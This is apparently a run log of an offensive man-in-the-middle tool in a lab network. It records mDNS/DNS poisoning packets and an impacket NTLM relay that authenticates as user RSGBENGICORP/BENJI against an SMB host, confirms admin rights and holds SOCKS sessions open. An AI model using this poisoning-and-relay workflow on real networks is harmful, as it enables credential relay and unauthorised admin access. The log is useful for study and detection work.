2021-10-31 09:14:21.505 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:277 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
2021-11-02 11:26:55.272 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:55.273 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:55.273 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.212 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.213 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.214 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.214 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.225 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-02 11:26:56.376 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-02 11:26:56.380 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:26:56.381 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:26:56.383 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:231 - Checking admin status for user RSGBENGICORP/BENJI
2021-11-02 11:26:56.390 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-02 11:26:56.391 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-02 11:26:56.413 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:238 - isAdmin returned: TRUE
2021-11-02 11:26:56.460 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.460 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.462 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.462 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.463 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.463 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:56.465 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:56.465 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:57.453 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:57.453 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:26:57.458 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:26:57.459 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:27:00.894 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:handle:297 - SOCKS: New Connection from 192.168.253.135(36568)
2021-11-02 11:27:00.895 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:handle:339 - SOCKS: Target is 104.116.116.112(21536)
2021-11-02 11:27:00.895 | ERROR    | impacket.examples.ntlmrelayx.servers.socksserver:handle:350 - SOCKS: Don't have a relay for 104.116.116.112(21536)
2021-11-02 11:27:00.895 | ERROR    | project.ManInTheMiddle.maninthemiddle:do_show_connections:326 - Error when opening connections
2021-11-02 11:27:19.215 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:27:19.215 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:27:49.765 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:27:50.188 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:28:06.115 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:285 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-02 11:28:06.115 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-11-02 11:28:06.118 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:199 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-11-02 11:28:06.136 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-02 11:28:06.138 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:79 - Starting smb-relay server...
2021-11-02 11:28:06.146 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-11-02 11:28:11.598 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:11.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:11.600 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-02 11:28:11.647 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:11.648 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:11.648 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-02 11:28:11.686 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:11.687 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:11.690 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:11.690 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.593 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.593 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.594 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.594 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.608 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-02 11:28:12.634 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-02 11:28:12.634 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:28:12.635 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:28:12.635 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:231 - Checking admin status for user RSGBENGICORP/BENJI
2021-11-02 11:28:12.638 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-02 11:28:12.640 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-02 11:28:12.648 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:238 - isAdmin returned: TRUE
2021-11-02 11:28:12.659 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.660 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.661 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.662 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.662 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:12.663 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:12.663 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:13.655 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:13.655 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:13.656 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:28:13.656 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:28:19.648 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:handle:297 - SOCKS: New Connection from 192.168.253.135(36572)
2021-11-02 11:28:19.648 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:handle:339 - SOCKS: Target is 104.116.116.112(21536)
2021-11-02 11:28:19.648 | ERROR    | impacket.examples.ntlmrelayx.servers.socksserver:handle:350 - SOCKS: Don't have a relay for 104.116.116.112(21536)
2021-11-02 11:28:36.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:28:36.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:29:06.129 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:29:06.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:29:36.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:29:36.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:30:06.845 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:30:09.334 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:30:36.469 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:30:36.469 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:31:06.131 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:31:06.131 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:31:36.131 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:31:36.132 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:32:06.130 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:179 - KeepAlive Timer reached. Updating connections
2021-11-02 11:32:06.131 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:keepAliveTimer:188 - Calling keepAlive() for RSGBENGICORP/BENJI@192.168.253.129:445
2021-11-02 11:32:42.848 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:285 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-02 11:32:42.848 | DEBUG    | project.igris:check_settable_variables_value:190 - Checking the correct value of the necessary settable variables 
2021-11-02 11:32:42.851 | INFO     | project.ManInTheMiddle.maninthemiddle:__asynchronous_attack:199 - Running ntlm relay on the background the results will be saved at: [32mlogs/ntlm_relay.log[39m 
2021-11-02 11:32:42.873 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-02 11:32:42.874 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:79 - Starting smb-relay server...
2021-11-02 11:32:42.881 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-11-02 11:32:49.282 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:49.282 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:49.282 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-02 11:32:49.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:49.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:49.316 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-02 11:32:49.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:49.348 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:49.349 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:49.349 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.282 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.283 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.286 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.287 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.309 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:388 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
2021-11-02 11:32:50.343 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetup:317 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
2021-11-02 11:32:50.344 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:32:50.346 | INFO     | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:215 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
2021-11-02 11:32:50.346 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:231 - Checking admin status for user RSGBENGICORP/BENJI
2021-11-02 11:32:50.347 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:138 - No more targets for user RSGBENGICORP/BENJI
2021-11-02 11:32:50.347 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smb2TreeConnect:384 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
2021-11-02 11:32:50.360 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:activeConnectionsWatcher:238 - isAdmin returned: TRUE
2021-11-02 11:32:50.425 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.426 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.430 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.431 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.434 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.434 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:50.437 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-02 11:32:50.438 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-02 11:32:51.425 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
